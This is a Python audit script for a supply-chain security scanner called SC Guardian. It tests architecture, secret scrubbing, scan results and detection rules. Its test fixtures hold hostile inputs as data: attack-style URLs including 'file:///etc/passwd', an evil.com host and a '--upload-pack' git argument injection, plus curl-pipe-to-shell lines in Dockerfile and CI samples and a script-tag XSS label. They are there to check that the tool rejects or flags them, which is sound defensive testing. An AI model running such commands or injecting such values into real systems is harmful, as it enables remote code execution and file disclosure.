"""Architecture and behaviour audit for SC Guardian (no pytest needed).

Usage:  python scripts/audit_check.py [--offline] [--with-scanners]
  --offline        skip checks that need the network (OSV known-answer test)
  --with-scanners  also scan the fixture with every installed external scanner (Syft/Trivy) and compare with the rule engine

Exit code 0 = every check passed. Each check prints PASS/FAIL/SKIP and a reason.
"""
from __future__ import annotations

import ast
import json
import os
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

OFFLINE = "--offline" in sys.argv
WITH_SCANNERS = "--with-scanners" in sys.argv
results: list[tuple[str, str, str]] = []


def check(name: str, ok: bool | None, detail: str = "") -> None:
    status = "SKIP" if ok is None else ("PASS" if ok else "FAIL")
    results.append((name, status, detail))
    print(f"[{status}] {name}" + (f" - {detail}" if detail else ""))


def guarded(name: str):
    def deco(fn):
        try:
            fn()
        except Exception as e:  # a crashing check is a failing check
            import traceback
            check(name, False, f"{type(e).__name__}: {e}\n{traceback.format_exc()[-400:]}")
        return fn
    return deco


# ------------------------------------------------------------------------------------------------ architecture
LAYERS = {  # package -> packages it must NOT import (dependency direction: ui -> orchestration -> agents -> domain -> core/storage)
    "core": {"ui", "agents", "orchestration"},
    "storage": {"ui", "agents", "orchestration"},
    "sbom": {"ui", "agents", "orchestration"},
    "graph": {"ui", "agents", "orchestration"},
    "vulnerability": {"ui", "agents", "orchestration"},
    "suspicious_changes": {"ui", "agents", "orchestration"},
    "risk_analysis": {"ui", "agents", "orchestration"},
    "explainability": {"ui", "agents", "orchestration"},
    "reporting": {"ui", "agents", "orchestration"},
    "agents": {"ui", "orchestration"},
    "orchestration": {"ui"},
}


@guarded("layering")
def _layering() -> None:
    bad = []
    for pkg, forbidden in LAYERS.items():
        for f in (ROOT / pkg).rglob("*.py"):
            tree = ast.parse(f.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                mods = [node.module] if isinstance(node, ast.ImportFrom) and node.module else [a.name for a in node.names] if isinstance(node, ast.Import) else []
                for m in mods:
                    if m.split(".")[0] in forbidden:
                        bad.append(f"{f.relative_to(ROOT)} imports {m}")
    # core.scan_orchestrator is the documented entry point that lazily calls orchestration; allow only that one
    bad = [b for b in bad if not b.startswith("core\\scan_orchestrator.py") and not b.startswith("core/scan_orchestrator.py")]
    check("architecture: layer dependencies point downwards only", not bad, "; ".join(bad[:5]))


@guarded("subprocess")
def _subprocess_env() -> None:
    missing = []
    for f in ROOT.rglob("*.py"):
        if ".venv" in f.parts or f.name == "audit_check.py" or f.parent.name == "scripts":
            continue
        src = f.read_text(encoding="utf-8")
        tree = ast.parse(src)
        for n in ast.walk(tree):
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in ("run", "Popen", "check_output") \
                    and isinstance(n.func.value, ast.Name) and n.func.value.id == "subprocess":
                kws = {k.arg for k in n.keywords}
                if "env" not in kws or "shell" not in kws:
                    missing.append(f"{f.relative_to(ROOT)}:{n.lineno}")
    check("security: every subprocess call passes an explicit env and shell=False", not missing, ", ".join(missing))


@guarded("secrets")
def _secrets() -> None:
    from core.safe_env import scrubbed_env
    os.environ["ANTHROPIC_API_KEY"] = "sk-audit-secret"
    os.environ["NVD_API_KEY"] = "nvd-audit-secret"
    try:
        env = scrubbed_env()
        check("security: API keys are absent from subprocess environments", not any("audit-secret" in v for v in env.values()))
    finally:
        os.environ.pop("ANTHROPIC_API_KEY")
        os.environ.pop("NVD_API_KEY")


@guarded("steps")
def _pipeline_shape() -> None:
    from agents.runtime import STEPS
    from orchestration.pipeline import NODES, build_graph, mermaid
    owned = {s for _, steps, _ in NODES.values() for s in steps}
    missing = [s[0] for s in STEPS if s[0] not in owned and s[0] not in ("validate", "clone")]
    check("orchestration: every runtime step is owned by a graph node", not missing, ", ".join(missing))
    m = mermaid()
    check("orchestration: graph compiles with parallel branches and a conditional edge",
          bool(m) and "graph --> typosquat" in m and "graph --> vulnerability" in m and "sbom_quality -.->" in m)
    build_graph().compile()


# ------------------------------------------------------------------------------------------------ behaviour
def _fixture(td: Path) -> Path:
    fx = td / "fx"
    for svc in ("svc_a", "svc_b"):
        d = fx / svc
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": svc, "version": "1.0.0", "dependencies": {"minimist": "1.2.0"}}))
        (d / "package-lock.json").write_text(json.dumps({"name": svc, "version": "1.0.0", "lockfileVersion": 3, "packages": {
            "": {"name": svc, "version": "1.0.0", "dependencies": {"minimist": "1.2.0"}},
            "node_modules/minimist": {"version": "1.2.0", "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.0.tgz", "integrity": "sha512-xxxxxxxxxxxx"}}}))
    return fx


def _settings(td: Path):
    from config.settings import Settings
    s = Settings()
    s.data_dir, s.artifacts_dir, s.workspace_dir = td / "data", td / "art", td / "ws"
    for d in (s.data_dir, s.workspace_dir, *(s.artifacts_dir / x for x in ("sbom", "scans", "reports", "graphs"))):
        d.mkdir(parents=True, exist_ok=True)
    return s


def _opts(**kw):
    from core.scan_orchestrator import ScanOptions
    base = dict(url="local", use_nvd=False, use_kev=False, registry_checks=False, reuse_cached=False)
    base.update(kw)
    return ScanOptions(**base)


@guarded("scan")
def _scan_checks() -> None:
    from core.scan_orchestrator import scan_local_directory
    from storage.database import Database
    td = Path(tempfile.mkdtemp())
    s, fx = _settings(td), _fixture(td)
    db = Database(s.db_path)
    modes = ["builtin"] + (["syft", "trivy"] if WITH_SCANNERS else [])
    out = {}
    for mode in modes:
        if OFFLINE:
            check(f"scan[{mode}]: fixture scan", None, "needs OSV (offline)")
            continue
        r = scan_local_directory(fx, _opts(sbom_scanner=mode), s, db, name="fx")
        pk = sorted((c["name"], c["service_dir"], c["version"]) for c in r["components"] if not c.get("is_self") and c["type"] != "file")
        out[mode] = (pk, len(r["vulnerabilities"]), r["sbom_tool"]["used"])
        ok = r["status"] == "completed" and Path(r["sbom_path"]).exists() and r["sbom"]["validation"]["valid"]
        check(f"scan[{mode}]: completed, valid CycloneDX file on disk (used {r['sbom_tool']['used']})", ok, "; ".join(e["error"] for e in r["errors"]))
        check(f"scan[{mode}]: both services keep their own component and graph root", len(pk) == 2 and len(r["graph"]["roots"]) == 2, str(pk))
        check(f"scan[{mode}]: persisted graph tables match the result", (db.load_graph(r["repo"]["scan_id"]) or {}).get("nodes") is not None)
        if mode == "builtin":
            base = r
    if len(out) > 1:
        ref = out["builtin"]
        check("parity: every scanner yields the same package set and finding count as the rule engine",
              all(v[0] == ref[0] and v[1] == ref[1] for v in out.values()), str({k: (v[1], v[2]) for k, v in out.items()}))
    if OFFLINE:
        return

    # failure containment: a crashing agent degrades the scan, never crashes it or leaves UI keys missing
    import orchestration.pipeline as P
    orig = P.risk.score
    P.risk.score = lambda st, rt: (_ for _ in ()).throw(RuntimeError("injected"))
    try:
        r = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="fx-fail")
    finally:
        P.risk.score = orig
    need = {"summary", "analyst", "risk_assessments", "explanations", "memory", "graph", "vulnerabilities", "limitations", "errors"}
    check("resilience: failed risk step -> run completes with errors, dependents skipped, full schema present",
          r["status"] == "completed_with_errors" and need <= set(r) and any(e["stage"] == "risk" for e in r["errors"]), str(sorted(need - set(r))))

    # memory
    from storage.memory import Memory
    r1 = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    r2 = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    c = r2["memory"]["diff"]["counts"]
    check("memory: scanning the same repo twice -> nothing new, nothing fixed, all persisting", c["new"] == 0 and c["persisting"] > 0 and c["fixed"] == 0, str(c))
    m = Memory(db)
    fp = next(iter(r2["memory"]["fingerprints"].values()))
    d1 = m.add_decision(r2["repo"]["url"], fp, "accepted_risk", "audit", "t", 1)
    check("memory: decision is active, newest wins, expiry honoured", fp in m.decisions(r2["repo"]["url"]))
    with db.connect() as cx:
        cx.execute("UPDATE decisions SET expires_at='2000-01-01T00:00:00Z' WHERE id=?", (d1,))
    check("memory: expired decision no longer applies", fp not in m.decisions(r2["repo"]["url"]))
    # graph diff between the two scans must be identical (same input)
    from graph.graph_diff import diff_graphs
    check("graph: diff of two scans of identical input is identical", diff_graphs(db.load_graph(r1["repo"]["scan_id"]), db.load_graph(r2["repo"]["scan_id"]))["identical"])
    # retention
    for _ in range(3):
        scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    ids = db.prune_repo(r2["repo"]["url"], 2)
    check("storage: prune keeps only the newest N scans of a repository", len(db.list_scans()) >= 2 and len(ids) >= 1)


@guarded("reuse")
def _reuse_rules() -> None:
    from core.scan_orchestrator import SCANNER_VERSION, options_fingerprint, reusable
    from risk_analysis.risk_rules import RULES_VERSION
    td = Path(tempfile.mkdtemp())
    s = _settings(td)
    sbom = td / "x.cdx.json"
    sbom.write_text("{}")
    o = _opts(sbom_scanner="auto")
    base = {"status": "completed", "repo": {"scan_timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}, "tool_versions": {"scanner": SCANNER_VERSION},
            "risk_rules_version": RULES_VERSION, "options_fp": options_fingerprint(o), "sbom_tool": {"used": "builtin"}, "sbom_path": str(sbom)}
    check("freshness: a fresh identical scan is reusable", reusable(base, o, s)[0])
    old = dict(base, repo={"scan_timestamp": "2020-01-01T00:00:00Z"})
    check("freshness: a stored scan older than the TTL is not reused", not reusable(old, o, s)[0])
    check("freshness: different scanner/rule version is not reused", not reusable(dict(base, tool_versions={"scanner": "0"}), o, s)[0])
    check("freshness: different options are not reused", not reusable(base, _opts(sbom_scanner="auto", use_nvd=True), s)[0])


@guarded("urls")
def _urls() -> None:
    from core.url_validator import InvalidRepositoryURL, validate_github_url
    bad = ["file:///etc/passwd", "C:\\Windows", "https://evil.com/a/b", "https://user:pw@github.com/a/b", "https://github.com:22/a/b", "https://github.com/a/b/../../c",
           "--upload-pack=x", "ssh://git@github.com/a/b", "https://github.com/a"]
    leaked = []
    for u in bad:
        try:
            validate_github_url(u)
            leaked.append(u)
        except (InvalidRepositoryURL, ValueError):
            pass
    ok = []
    for u in ["https://github.com/pallets/flask", "github.com/pallets/flask", "git@github.com:pallets/flask.git", "https://github.com/pallets/flask/tree/main"]:
        try:
            validate_github_url(u)
            ok.append(u)
        except Exception:
            pass
    check("security: attack-style URLs are rejected", not leaked, ", ".join(leaked))
    rebuilt = validate_github_url("https://github.com/a/b?x=`id`#frag").clone_url
    check("security: clone URL is rebuilt from owner/name (query and fragment never reach git)", rebuilt == "https://github.com/a/b.git", rebuilt)
    check("usability: all accepted URL forms validate", len(ok) == 4)


@guarded("graph_precedence")
def _adapters() -> None:
    from sbom.adapters import get_adapter
    raw = {"components": [{"type": "application", "name": "package-lock.json", "bom-ref": "A"}, {"type": "library", "name": "x", "version": "1", "purl": "pkg:npm/x@1", "bom-ref": "pkg:npm/x@1"}],
           "dependencies": [{"ref": "A", "dependsOn": ["pkg:npm/x@1"]}, {"ref": "pkg:npm/x@1", "dependsOn": []}], "metadata": {"component": {"bom-ref": "R"}}}
    snap = json.dumps(raw, sort_keys=True)
    doc = get_adapter("trivy").canonicalize(raw)
    check("normalisation: Trivy adapter folds lockfile applications into locations and never mutates the raw document",
          json.dumps(raw, sort_keys=True) == snap and len(doc["components"]) == 1 and doc["components"][0]["properties"][-1]["value"] == "package-lock.json")


@guarded("fusion")
def _fusion() -> None:
    from core.http import HttpClient, SourceUnavailable
    from core.models import Component, LockDependency
    from sbom.fusion import engine, ledger
    from sbom.fusion.hashes import parse_digest
    from sbom.fusion.writer import write_fused
    from sbom.cyclonedx_validator import validate_cyclonedx

    sri = "sha512-7Wl+Jz+IGWuSdgsQEJ4JunVTlzCqPgnbc7dqCPPQwDfuOkr6Np3XLuC/Hlr1rXbyBz5TrFZcrzFOvDMr7p58zw=="
    d = parse_digest(sri)
    check("fusion: SRI digest converts to the correct hex", d and d["alg"] == "sha512" and d["hex"].startswith("ed697e27"))
    c = Component(bom_ref="a", name="x", version="1", ecosystem="npm", licenses=["GPL-3.0"], sources=["syft"])
    ledger.init_scanner_provenance(c)
    ledger.set_field(c, "licenses", ["MIT"], "lockfile", "lock")
    ok1 = c.licenses == ["MIT"] and c.provenance["licenses"]["source"] == "lockfile" and c.provenance["licenses"]["conflicts"][0]["source"].startswith("scanner")
    ledger.set_field(c, "licenses", ["Apache-2.0"], "registry:npm", "reg")
    check("fusion: lockfile outranks scanner and registry; the displaced/rejected values are kept as conflicts", ok1 and c.licenses == ["MIT"] and len(c.provenance["licenses"]["conflicts"]) == 2)
    e = Component(bom_ref="b", name="y", version="1", ecosystem="npm")
    ledger.set_field(e, "licenses", [], "registry")
    check("fusion: nothing is invented (empty values do not create provenance)", e.licenses == [] and "licenses" not in e.provenance)

    ld = LockDependency(name="x", version="1", ecosystem="npm", lockfile="package-lock.json", service_dir=".", integrity=sri, license="MIT", direct=True, meta={"install_script": True})
    comp = Component(bom_ref="a", name="x", version="1", ecosystem="npm", service_dir=".", sources=["syft"])
    engine.apply_lockfile([comp], [ld])
    check("fusion: native lockfile facts (hash, license, install script, scope) reach the component",
          comp.hashes and comp.licenses == ["MIT"] and comp.install_script and comp.scope == "required" and comp.provenance["hashes"]["source"] == "lockfile")
    for digest, expect in ((d["hex"], "verified"), ("0" * 128, "mismatch")):
        cc = comp.model_copy(deep=True)
        cc.integrity = dict(cc.integrity)
        engine._apply_record(cc, {"sources": {"npm-registry": "u"}, "digests": [{"alg": "sha512", "hex": digest, "kind": "file"}]})
        check(f"integrity: lockfile digest vs registry -> {expect}", cc.integrity.get("status") == expect)
    cc = Component(bom_ref="z", name="z", version="1", ecosystem="npm")
    engine._apply_record(cc, {"sources": {"npm-registry": "u"}, "digests": [{"alg": "sha512", "hex": "ab" * 64, "kind": "file"}]})
    check("integrity: no lockfile digest -> registry digest added with medium confidence", cc.integrity.get("status") == "absent" and cc.provenance["hashes"]["confidence"] == "medium")

    # registry outage must degrade quickly and honestly, never hang or invent data
    class Down(HttpClient):
        def request(self, *a, **k):
            raise SourceUnavailable("down")
    comps = [Component(bom_ref=f"p{i}", name=f"pkg{i}", version="1.0.0", ecosystem="npm", service_dir=".") for i in range(12)]
    t0 = time.time()
    rep = engine.fuse(comps, [], Down(retries=0), None, registry=True, budget_s=20)
    check("resilience: registry outage -> breaker trips fast, no data invented, report says unavailable",
          time.time() - t0 < 10 and rep["registry_phase"]["hosts_tripped"] and all(not c.licenses for c in comps), str(rep["registry_phase"]))

    doc = {"bomFormat": "CycloneDX", "specVersion": "1.6", "components": [{"type": "library", "name": "x", "version": "1", "bom-ref": "a", "purl": "pkg:npm/x@1"}], "dependencies": []}
    out = write_fused(doc, [comp], {"average_completeness": 0.5, "integrity": {"verified": 1}}, "builtin")
    ent = out["components"][0]
    check("writer: fused CycloneDX is valid and carries licenses, hashes, scope and provenance properties",
          validate_cyclonedx(out)["valid"] and ent["licenses"][0]["license"]["id"] == "MIT" and ent["hashes"][0]["alg"] == "SHA-512" and ent["scope"] == "required"
          and any(pp["name"] == "sc-guardian:provenance:hashes" for pp in ent["properties"]))
    check("writer: the input (scanner) document is not modified", "hashes" not in doc["components"][0])


@guarded("resolver")
def _resolver() -> None:
    from core.models import LockDependency
    from sbom.fusion.resolver import candidates
    mk = lambda **k: LockDependency(ecosystem="Maven", name="g:a", version="1.0", service_dir=".", direct=True, **k)  # noqa: E731
    pom = mk(lockfile="pom.xml")
    check("resolver: pinned direct deps of a pom.xml-only service are resolution candidates", len(candidates([pom])) == 1)
    lockd = LockDependency(ecosystem="Maven", name="g:b", version="2", service_dir=".", lockfile="gradle.lockfile")
    check("resolver: a service with a real lockfile is never resolved (the lockfile is authoritative)", candidates([pom, lockd]) == [])
    check("resolver: unpinned or non-direct records are skipped", candidates([mk(lockfile="pom.xml").model_copy(update={"version": None}), mk(lockfile="pom.xml").model_copy(update={"direct": False})]) == [])


@guarded("config")
def _config() -> None:
    from config.settings import get_settings
    saved = {k: os.environ.get(k) for k in ("SCANNER_CLONE_TIMEOUT_S", "SCANNER_HTTP_RETRIES", "SCANNER_CLONE_DEPTH")}
    os.environ.update({"SCANNER_CLONE_TIMEOUT_S": "abc", "SCANNER_HTTP_RETRIES": "99", "SCANNER_CLONE_DEPTH": "7"})
    try:
        s = get_settings()
        check("config: invalid values are ignored with a reported problem, valid env override wins",
              s.clone_timeout_s == 180 and s.http_retries == 3 and s.clone_depth == 7 and len(s.problems) >= 2 and s.sources["clone_depth"] == "env", str(s.problems))
    finally:
        for k, v in saved.items():
            os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
    tf = Path(tempfile.mkdtemp()) / "scanner.toml"
    tf.write_text('clone_depth = 9\nnvd_api_key = "leak"\nbogus = 1\n')
    os.environ["SCANNER_CONFIG"] = str(tf)
    try:
        s = get_settings()
        check("config: file value applies, secrets in the file are rejected, unknown keys reported",
              s.clone_depth == 9 and not s.nvd_api_key and any("secret" in p for p in s.problems) and any("bogus" in p for p in s.problems) and s.sources["clone_depth"] == "file")
    finally:
        os.environ.pop("SCANNER_CONFIG", None)


@guarded("cache")
def _cache() -> None:
    from storage.cache import Cache
    from storage.database import Database
    db = Database(Path(tempfile.mkdtemp()) / "c.db")
    c = Cache(db)
    for i in range(30):
        c.set("ns", f"k{i}", {"i": i})
    with db.connect() as cx:
        cx.execute("UPDATE cache SET fetched_at = fetched_at - ? WHERE key IN ('k0','k1')", (200 * 86400,))
    r = c.maintain(max_age_days=120, max_rows=20)
    st_ = c.stats()
    check("cache: rows older than the limit and rows beyond the row cap are purged (oldest first)", r["purged_old"] == 2 and st_["total_rows"] == 20, str(r))
    h = db.health()
    check("database: integrity check passes and schema version is current", h["integrity"] == "ok" and h["schema_version"] >= 2, str(h["schema_version"]))


@guarded("tree")
def _tree() -> None:
    import networkx as nx
    from graph.tree_view import build_reverse_tree, build_tree, graph_stats, tree_html
    g = nx.DiGraph()
    g.add_node("root:.", kind="root", label="app", service_dir=".")
    for n in ("a", "b", "c", "d"):
        g.add_node(n, kind="component", label=f"{n}@1")
    g.add_edges_from([("root:.", "a"), ("root:.", "b"), ("a", "c"), ("b", "c"), ("c", "d"), ("d", "a")])  # shared child + a cycle
    t = build_tree(g, "root:.", {"d": "HIGH"}, {})
    check("graph tree: shared dependencies are expanded once and shown as references; cycles terminate", t["tree"]["descendants"] == 4 and "shown above" in tree_html(t["tree"]))
    rv = build_reverse_tree(g, "d", {"d": "HIGH"}, {})
    check("graph tree: bottom-up view reaches the service root", "app" in tree_html(rv["tree"], 9))
    st_ = graph_stats(g, {"d": "HIGH"})
    check("graph stats: depth histogram and vulnerable depth are computed", st_["depth_histogram"] == {1: 2, 2: 1, 3: 1} and st_["vulnerable_by_depth"] == {3: 1} and st_["has_cycles"], str(st_["depth_histogram"]))
    ev = "<script>alert(1)</script>"
    g.add_node("e", kind="component", label=ev)
    g.add_edge("root:.", "e")
    check("graph tree: package names are HTML-escaped", "<script>" not in tree_html(build_tree(g, "root:.", {}, {})["tree"]))


@guarded("pipeline")
def _pipeline() -> None:
    from pipeline_analysis.ci import analyze_github_workflow, analyze_generic_ci
    from pipeline_analysis.dockerfile import analyze_compose, analyze_dockerfile
    bad = "FROM node:16\nARG NPM_TOKEN=supersecretvalue1\nADD https://e.com/t.tgz /o/\nRUN curl -sSL https://x.sh | bash\nCOPY .env /app/\nCMD [\"node\"]\n"
    f, imgs = analyze_dockerfile(bad, "Dockerfile")
    ids = {x.rule_id for x in f}
    check("pipeline: insecure Dockerfile yields the expected rules (DF001/2, DF003 root, DF004 ADD url, DF005 curl|sh, DF006 secret, DF011 .env, DF012 EOL)",
          {"DF003", "DF004", "DF005", "DF006", "DF011", "DF012"} <= ids and imgs and imgs[0]["kind"] == "official", str(sorted(ids)))
    check("pipeline: credential values are never copied into findings", all("supersecretvalue1" not in (x.snippet + x.why + x.remediation + str(x.extra)) for x in f))
    good = "FROM python:3.13-slim@sha256:" + "a" * 64 + "\nRUN useradd -m app\nUSER app\nCMD [\"python\"]\n"
    check("pipeline: a pinned, non-root Dockerfile has no HIGH/CRITICAL finding", not [x for x in analyze_dockerfile(good, "Dockerfile")[0] if x.severity in ("HIGH", "CRITICAL")])
    wf = ("on:\n  pull_request_target:\npermissions: write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
          "      - uses: x/y@main\n      - run: echo ${{ github.event.pull_request.title }}\n")
    w, acts = analyze_github_workflow(wf, ".github/workflows/a.yml")
    wid = {x.rule_id for x in w}
    check("pipeline: workflow rules (pwn-request GHA002, permissions GHA004, unpinned GHA001, injection GHA003)", {"GHA001", "GHA002", "GHA003", "GHA004"} <= wid and len(acts) == 2, str(sorted(wid)))
    pinned = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@" + "b" * 40 + "\n"
    check("pipeline: SHA-pinned action with read-only permissions raises nothing", not analyze_github_workflow(pinned, ".github/workflows/b.yml")[0])
    c, _ = analyze_compose("services:\n  a:\n    image: nginx:latest\n    privileged: true\n", "docker-compose.yml")
    check("pipeline: compose privileged + latest detected", {"DC001", "DC002"} <= {x.rule_id for x in c})
    g, _ = analyze_generic_ci("script:\n  - curl http://evil/x.sh | sh\n", ".gitlab-ci.yml")
    check("pipeline: generic CI curl|sh and plain-HTTP fetch detected", {"CI001", "CI004"} <= {x.rule_id for x in g})
    from pipeline_analysis.eol import eol_note
    check("pipeline: end-of-life table flags node:16 / python:3.8 but not python:3.13 or unknown images", eol_note("node", "16") and eol_note("python", "3.8-slim") and not eol_note("python", "3.13") and not eol_note("myorg/node", "10"))


@guarded("ground_truth")
def _ground_truth() -> None:
    if OFFLINE:
        check("ground truth: known-answer OSV test", None, "offline")
        return
    from config.settings import get_settings
    from core.http import HttpClient
    from storage.cache import Cache
    from storage.database import Database
    from vulnerability.osv_client import OsvClient
    from vulnerability.verification import run_ground_truth
    s = get_settings()
    res = run_ground_truth(OsvClient(HttpClient(), Cache(Database(s.db_path))))
    check("ground truth: known-answer test (documented CVEs detected, patched versions clean)", res["evaluated"] > 0 and res["passed"] == res["evaluated"], f"{res['passed']}/{res['evaluated']}, precision {res['precision']}, recall {res['recall']}")


if __name__ == "__main__":
    fails = [r for r in results if r[1] == "FAIL"]
    print(f"\n{sum(1 for r in results if r[1] == 'PASS')} passed, {len(fails)} failed, {sum(1 for r in results if r[1] == 'SKIP')} skipped")
    sys.exit(1 if fails else 0)
